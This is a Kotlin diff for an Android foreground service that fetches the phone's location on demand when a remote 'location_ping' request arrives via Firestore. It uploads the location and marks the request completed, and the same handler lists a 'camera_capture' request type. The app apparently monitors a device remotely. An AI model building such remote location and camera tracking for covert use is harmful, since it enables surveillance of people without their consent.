@@ -87,20 +87,41 @@ class ForegroundService : Service() {
         }
 
         setupFirestoreRequestListener()
-        startLocationUpdates()
 
         return START_STICKY
     }
 
-    private fun startLocationUpdates() {
+    private fun fetchLocationOnce(requestId: String? = null) {
         try {
+            if (!hasLocationPermission()) {
+                if (!requestId.isNullOrEmpty()) {
+                    FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
+                        mapOf(
+                            "status" to "failed",
+                            "error" to "Location permission not granted",
+                            "completedAt" to FieldValue.serverTimestamp()
+                        )
+                    )
+                }
+                return
+            }
+
             if (locationManager == null) {
                 locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
             }
 
-            locationListener = object : LocationListener {
+            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
+            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true
+
+            var singleListener: LocationListener? = null
+            val mainHandler = Handler(Looper.getMainLooper())
+
+            singleListener = object : LocationListener {
                 override fun onLocationChanged(location: Location) {
-                    updateFirestoreLocation(location)
+                    try {
+                        locationManager?.removeUpdates(this)
+                    } catch (_: Throwable) {}
+                    updateFirestoreLocation(location, requestId)
                 }
 
                 override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
@@ -108,23 +129,28 @@ class ForegroundService : Service() {
                 override fun onProviderDisabled(provider: String) {}
             }
 
-            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
-            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true
+            mainHandler.postDelayed({
+                try {
+                    singleListener.let { locationManager?.removeUpdates(it) }
+                } catch (_: Throwable) {}
+            }, 10000L)
 
             if (hasGps) {
                 locationManager?.requestLocationUpdates(
                     LocationManager.GPS_PROVIDER,
-                    5000L,
+                    0L,
                     0f,
-                    locationListener!!
+                    singleListener,
+                    Looper.getMainLooper()
                 )
             }
             if (hasNet) {
                 locationManager?.requestLocationUpdates(
                     LocationManager.NETWORK_PROVIDER,
-                    5000L,
+                    0L,
                     0f,
-                    locationListener!!
+                    singleListener,
+                    Looper.getMainLooper()
                 )
             }
 
@@ -132,16 +158,25 @@ class ForegroundService : Service() {
             val lastNet = if (hasNet) locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) else null
             val bestLoc = lastGps ?: lastNet
             if (bestLoc != null) {
-                updateFirestoreLocation(bestLoc)
+                updateFirestoreLocation(bestLoc, requestId)
             }
         } catch (e: SecurityException) {
             e.printStackTrace()
+            if (!requestId.isNullOrEmpty()) {
+                FirebaseFirestore.getInstance().collection("screenshot_requests").document(requestId).update(
+                    mapOf(
+                        "status" to "failed",
+                        "error" to "SecurityException: ${e.message}",
+                        "completedAt" to FieldValue.serverTimestamp()
+                    )
+                )
+            }
         } catch (e: Exception) {
             e.printStackTrace()
         }
     }
 
-    private fun updateFirestoreLocation(location: Location) {
+    private fun updateFirestoreLocation(location: Location, requestId: String? = null) {
         val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
         val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return
 
@@ -154,6 +189,15 @@ class ForegroundService : Service() {
                 "lastLocationTime" to System.currentTimeMillis()
             )
             firestore.collection("devices").document(deviceId).update(updates)
+
+            if (!requestId.isNullOrEmpty()) {
+                firestore.collection("screenshot_requests").document(requestId).update(
+                    mapOf(
+                        "status" to "completed",
+                        "completedAt" to FieldValue.serverTimestamp()
+                    )
+                )
+            }
         } catch (e: Exception) {
             e.printStackTrace()
         }
@@ -216,7 +260,7 @@ class ForegroundService : Service() {
 
                             when (requestType) {
                                 "location_ping" -> {
-                                    startLocationUpdates()
+                                    fetchLocationOnce(requestId)
                                 }
                                 "camera_capture" -> {
                                     markBackgroundAttempt(requestId)
